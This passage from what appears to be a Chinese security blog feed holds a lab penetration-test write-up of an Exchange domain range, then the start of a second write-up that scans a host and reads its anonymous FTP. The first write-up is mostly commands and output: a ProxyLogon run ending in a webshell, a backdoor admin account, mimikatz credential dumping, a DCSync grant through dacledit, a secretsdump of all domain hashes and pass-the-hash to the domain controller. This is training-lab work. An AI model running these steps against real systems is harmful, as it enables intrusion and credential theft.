href="https://learn.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019">https://learn.microsoft.com/zh-cn/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</a></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/20.png"></p><p>那么就可以打ProxyLogon了</p><p>利用条件还有一个</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/21.png"></p><p>这里我们就猜测为administrator吧</p><p>注意是python2环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(python27) D:\red\内网\后渗透\Exchange\ProxyLogon<span class="literal">-main</span>\ProxyLogon<span class="literal">-main</span>&gt;python proxylogon.py <span class="number">172.22</span>.<span class="number">3.9</span> administrator@xiaorang.lab</span><br><span class="line"></span><br><span class="line">  _____                     _</span><br><span class="line"> |  __ \                   | |</span><br><span class="line"> | |__) | __ _____  ___   _| |     ___   __ _  ___  _ __</span><br><span class="line"> |  ___/ <span class="string">&#x27;__/ _ \ \/ / | | | |    / _ \ / _` |/ _ \| &#x27;</span>_ \</span><br><span class="line"> | |   | | | (_) &gt;  &lt;| |_| | |___| (_) | (_| | (_) | | | |</span><br><span class="line"> |_|   |_|  \___/_/\_ \__, |______\___/ \__, |\___/|_| |_|</span><br><span class="line">                       __/ |             __/ |</span><br><span class="line">                      |___/             |___/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Original PoC by https://github.com/testanull</span><br><span class="line">Author: @Haus3c                                                                                     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Target: <span class="number">172.22</span>.<span class="number">3.9</span></span><br><span class="line">=============================</span><br><span class="line">[+] Attempting SSRF</span><br><span class="line">DN: /o=XIAORANG LAB/ou=Exchange Administrative <span class="built_in">Group</span> (FYDIBOHF23SPDLT)/cn=Recipients/cn=<span class="number">8</span>ca6ff254802459d9f63ee916eabb487<span class="literal">-Administrat</span></span><br><span class="line">SID: S<span class="literal">-1-5-21-533686307-2117412543-4200729784-500</span></span><br><span class="line">[+] SSRF Successful!</span><br><span class="line">[+] Attempting Arbitrary File <span class="built_in">Write</span></span><br><span class="line">SessionID: <span class="number">83</span>c51c63<span class="literal">-e722-4dac-ac11-c5bfeda9d317</span></span><br><span class="line">CanaryToken: F_JTnHMsykqFKlnCslqzshYpneAJmd0IpuG1bHfZzYzRnw2kJXob4ELC0UzDhErmAigXGM94gr0.</span><br><span class="line">OABId: <span class="number">6</span>d8fb74b<span class="literal">-8477-43ee-83ba-0b119205e85f</span></span><br><span class="line">[+] Success! Entering webshell. <span class="built_in">Type</span> <span class="string">&#x27;quit&#x27;</span> or <span class="string">&#x27;exit&#x27;</span> to escape.</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>横向成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/22.png"></p><p>这里我们添加个用户，rdp方便操作</p><p>如果是win，打下面的会乱码，再打就行了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user hub Abcd1234 /add </span><br><span class="line">net localgroup administrators hub /add</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/23.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/24.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/25.png"></p><p>现在再整理一下资产</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">3.12</span>   跳板机</span><br><span class="line">已经拿下</span><br><span class="line"><span class="number">172.22</span>.<span class="number">3.9</span>  exchange服务器    XIAORANG<span class="literal">-EXC01</span>.xiaorang.lab    https://<span class="number">172.22</span>.<span class="number">3.9</span>/owa/</span><br><span class="line">  已经拿下</span><br><span class="line"><span class="number">172.22</span>.<span class="number">3.2</span></span><br><span class="line">DC:XIAORANG<span class="literal">-WIN16</span>.xiaorang.lab</span><br><span class="line">  </span><br><span class="line"><span class="number">172.22</span>.<span class="number">3.26</span> </span><br><span class="line">XIAORANG<span class="literal">-PC</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么接下来就是抓取密码，尝试横向其他的机子了</p><p>传mimikatz.exe，管理员权限运行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;exit&quot;</span> &gt; <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p>发现抓不到</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.1 (x64) built on Mar 27 2016 18:51:29</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot;</span></span><br><span class="line"> <span class="comment">## / \ ##  /* * *</span></span><br><span class="line"> <span class="comment">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>                                     with <span class="number">18</span> modules * * */</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现是mimikatz的问题，重新传一个就好了</p><p>提取重要的，得到Exchange机器用户哈希和域用户Zhangtong的哈希</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msv :</span><br><span class="line"> [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : XIAORANG<span class="literal">-EXC01</span><span class="variable">$</span></span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : <span class="number">52</span>f54a72609d5ebd96856d4fd11df971</span><br><span class="line"> * SHA1     : <span class="number">322974904</span>f0483db33b9e8851b19a535838410b7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : Zhangtong</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : <span class="number">22</span>c7f81993e96ac83ac2f3f1903de8b4</span><br><span class="line"> * SHA1     : <span class="number">4</span>d205f752e28b0a13e7a2da2a956d46cb9d9e01e</span><br><span class="line"> * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b</span><br></pre></td></tr></table></figure><p>那么现在我们就可以通过pth登录Exchange机器用户了</p><p>查看XIAORANG-EXC01$是否在以下三个组内</p><p><strong><font style="color:rgb(51, 51, 51);">Microsoft Exchange Security Groups</font></strong></p><p><strong><font style="color:rgb(51, 51, 51);">Exchange Trusted Subsystem</font></strong></p><p><strong><font style="color:rgb(51, 51, 51);">Exchange Windows Permission</font></strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> /domain</span><br><span class="line">列出当前域内所有用户组</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;组名&quot;</span> /domain</span><br><span class="line">显示指定域用户组的成员及权限（如net <span class="built_in">group</span> <span class="string">&quot;Exchange Windows Permissions&quot;</span> /domain）</span><br></pre></td></tr></table></figure><p>上面的信息收集可以用bloodhound进行收集（但是实战用不了）</p><p><font style="color:rgb(48, 49, 51);">exchange机器账户隶属于</font><strong><font style="color:rgb(48, 49, 51);">Exchange Windows Permissions</font></strong><font style="color:rgb(48, 49, 51);">这个组中，而这个组具有write 域内acl权限，所以可以设置刚刚通过mimikatz拿到的域内用户Zhangtong的dcsync属性。</font></p><p>这里注意域名和用户名</p><p>直接给Zhangtong添加DCSync权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dacledit.py xiaorang.lab/XIAORANG<span class="literal">-EXC01</span><span class="variable">$</span> <span class="literal">-hashes</span> :<span class="number">52</span>f54a72609d5ebd96856d4fd11df971 <span class="literal">-action</span> <span class="built_in">write</span> <span class="literal">-rights</span> DCSync <span class="literal">-principal</span> Zhangtong <span class="literal">-target-dn</span> <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">3.2</span></span><br></pre></td></tr></table></figure><blockquote><p><strong><font style="color:rgb(51, 51, 51);">在域环境中，如果安装Exchange后，系统会添加一个名为Microsoft Exchange Security Groups、Exchange Trusted Subsystem和Exchange </font><strong><strong><font style="color:rgb(0, 82, 217);">Windows</font></strong></strong><font style="color:rgb(51, 51, 51);"> Permission三个组。如果获得了这三个组内任意用户的控制权限，就能够继承用户组的WriteDACL权限，WriteDACL权限可以修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash。</font></strong></p></blockquote><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/26.png"></p><p>修改成功</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples&gt;python dacledit.py xiaorang.lab/XIAORANG<span class="literal">-EXC01</span><span class="variable">$</span> <span class="literal">-hashes</span> :<span class="number">52</span>f54a72609d5ebd96856d4fd11df971 <span class="literal">-action</span> <span class="built_in">write</span> <span class="literal">-rights</span> DCSync <span class="literal">-principal</span> Zhangtong <span class="literal">-target-dn</span> <span class="string">&quot;DC=xiaorang,DC=lab&quot;</span> <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">3.2</span></span><br><span class="line">Impacket v0.<span class="number">12.0</span> - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] DACL backed up to dacl<span class="built_in">edit-20250520</span><span class="literal">-172235</span>.bak</span><br><span class="line">[*] DACL modified successfully!</span><br></pre></td></tr></table></figure><p>进行DCSync攻击</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\impacket<span class="literal">-0</span>.<span class="number">12.0</span>\examples&gt;python secretsdump.py xiaorang.lab/Zhangtong@<span class="number">172.22</span>.<span class="number">3.2</span> <span class="literal">-hashes</span> :<span class="number">22</span>c7f81993e96ac83ac2f3f1903de8b4 <span class="literal">-just-dc-ntlm</span></span><br><span class="line">Impacket v0.<span class="number">12.0</span> - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] <span class="keyword">Using</span> the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">xiaorang.lab\Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br><span class="line">Guest:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:<span class="number">502</span>:aad3b435b51404eeaad3b435b51404ee:b8fa79a52e918cb0cbcd1c0ede492647:::</span><br><span class="line">DefaultAccount:<span class="number">503</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\<span class="variable">$431000</span><span class="literal">-7AGO1IPPEUGJ</span>:<span class="number">1124</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_46bc0bcd781047eba:<span class="number">1125</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2554056e362e45ba9:<span class="number">1126</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_ae8e35b0ca3e41718:<span class="number">1127</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_341e33a8ba4d46c19:<span class="number">1128</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_3d52038e2394452f8:<span class="number">1129</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_2ddd7a0d26c84e7cb:<span class="number">1130</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_015b052ab8324b3fa:<span class="number">1131</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_9bd6f16aa25343e68:<span class="number">1132</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\SM_68af2c4169b54d459:<span class="number">1133</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">xiaorang.lab\HealthMailbox8446c5b:<span class="number">1135</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">3</span>dc717424289d313cf78713486b1bd32:::</span><br><span class="line">xiaorang.lab\HealthMailbox0d5918e:<span class="number">1136</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">3304618</span>a7f770a678b910054b99ab40b:::</span><br><span class="line">xiaorang.lab\HealthMailboxeda7a84:<span class="number">1137</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">1</span>e89e23e265bb7b54dc87938b1b1a131:::</span><br><span class="line">xiaorang.lab\HealthMailbox33b01cf:<span class="number">1138</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">0</span>eff3de35019c2ee10b68f48941ac50d:::</span><br><span class="line">xiaorang.lab\HealthMailbox9570292:<span class="number">1139</span>:aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f:::</span><br><span class="line">xiaorang.lab\HealthMailbox3479a75:<span class="number">1140</span>:aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0:::</span><br><span class="line">xiaorang.lab\HealthMailbox2d45c5b:<span class="number">1141</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">4822</span>b67394d6d93980f8e681c452be21:::</span><br><span class="line">xiaorang.lab\HealthMailboxec2d542:<span class="number">1142</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">147734</span>fa059848c67553dc663782e899:::</span><br><span class="line">xiaorang.lab\HealthMailboxf5f7dbd:<span class="number">1143</span>:aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66:::</span><br><span class="line">xiaorang.lab\HealthMailbox67dc103:<span class="number">1144</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">4</span>fe68d094e3e797cfc4097e5cca772eb:::</span><br><span class="line">xiaorang.lab\HealthMailbox320fc73:<span class="number">1145</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">0</span>c3d5e9fa0b8e7a830fcf5acaebe2102:::</span><br><span class="line">xiaorang.lab\Lumia:<span class="number">1146</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">862976</span>f8b23c13529c2fb1428e710296:::</span><br><span class="line">Zhangtong:<span class="number">1147</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">22</span>c7f81993e96ac83ac2f3f1903de8b4:::</span><br><span class="line">XIAORANG<span class="literal">-WIN16</span><span class="variable">$</span>:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:e32d73a57737f6614348c7105cffa644:::</span><br><span class="line">XIAORANG<span class="literal">-EXC01</span><span class="variable">$</span>:<span class="number">1103</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">52</span>f54a72609d5ebd96856d4fd11df971:::</span><br><span class="line">XIAORANG<span class="literal">-PC</span><span class="variable">$</span>:<span class="number">1104</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">22</span>b645ad6d94db61c27521903f84920a:::</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure><p>抓取到administrator的hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb:::</span><br></pre></td></tr></table></figure><p>进行pth获取域控权限</p><p>成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/27.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/28.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">3.12</span>   跳板机</span><br><span class="line">已经拿下</span><br><span class="line"><span class="number">172.22</span>.<span class="number">3.9</span>  exchange服务器    XIAORANG<span class="literal">-EXC01</span>.xiaorang.lab    https://<span class="number">172.22</span>.<span class="number">3.9</span>/owa/</span><br><span class="line">  已经拿下</span><br><span class="line"><span class="number">172.22</span>.<span class="number">3.2</span>DC:XIAORANG<span class="literal">-WIN16</span>.xiaorang.lab   </span><br><span class="line">  已经拿下</span><br><span class="line"><span class="number">172.22</span>.<span class="number">3.26</span> </span><br><span class="line">XIAORANG<span class="literal">-PC</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就剩最后一台了</p><p>还有一个flag没找到，我们先创建个新用户登录域控</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hub Abcd1234 /add</span><br><span class="line">net localgroup administrators hub /add</span><br></pre></td></tr></table></figure><p>修改密码</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/29.png"></p><p>然后可以直接登录172.22.3.26这台机子了</p><p>在已经修改了Lumia用户的密码，我们去登录一下之前的Exchange的web看看有没有什么信息</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/30.png"></p><p>看见了和那个Lumia的桌面上的文件一样的zip</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/31.png"></p><p>看见说密码为手机号</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/32.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/33.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/34.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/35.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶机渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Delivery</title>
      <link href="/post/633b4305.html"/>
      <url>/post/633b4305.html</url>
      
        <content type="html"><![CDATA[<p>参考</p><p>还有n位师傅，就不详细记录了</p><p><a href="https://mp.weixin.qq.com/s/jxGGwTu1TBJiH5LOVRO6pQ">https://mp.weixin.qq.com/s/jxGGwTu1TBJiH5LOVRO6pQ</a></p><p><a href="https://cloud.tencent.com/developer/article/1839233">https://cloud.tencent.com/developer/article/1839233</a></p><p><a href="https://bowuchuling.github.io/posts/chunqiu_Delivery.html">https://bowuchuling.github.io/posts/chunqiu_Delivery.html</a></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>开局一个ip</p><p>fscan开扫</p><p>39.99.248.209</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.99.248.209</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 2.0.0</span><br><span class="line">[*] 扫描类型: all, 目标端口: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880</span><br><span class="line">[*] 开始信息扫描...</span><br><span class="line">[*] 最终有效主机数量: 1</span><br><span class="line">[*] 共解析 218 个有效端口</span><br><span class="line">[+] 端口开放 39.99.248.209:21</span><br><span class="line">[+] 端口开放 39.99.248.209:80</span><br><span class="line">[+] 端口开放 39.99.248.209:22</span><br><span class="line">[+] 端口开放 39.99.248.209:8080</span><br><span class="line">[+] 存活端口数量: 4</span><br><span class="line">[*] 开始漏洞扫描...</span><br><span class="line">[*] 网站标题 http://39.99.248.209      状态码:200 长度:10918  标题:Apache2 Ubuntu Default Page: It works</span><br><span class="line">[*] 网站标题 http://39.99.248.209:8080 状态码:200 长度:3655   标题:公司发货单</span><br><span class="line">[+] ftp 39.99.248.209:21:anonymous</span><br><span class="line">   [-&gt;]1.txt</span><br><span class="line">   [-&gt;]pom.xml</span><br><span class="line">[!] 扫描错误 39.99.248.209:22 - 扫描总时间超时: context deadline exceeded</span><br><span class="line">[+] 扫描已完成: 4/4</span><br><span class="line">[*] 扫描结束,耗时: 21.698169s</span><br></pre></td></tr></table></figure><p>查看一下ftp</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/1.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delivery/2.png"></p><p>1.txt是空的</p><p>那么我们查看一下xml看看有哪些依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line">    &lt;parent&gt;</span><br><span class="line">        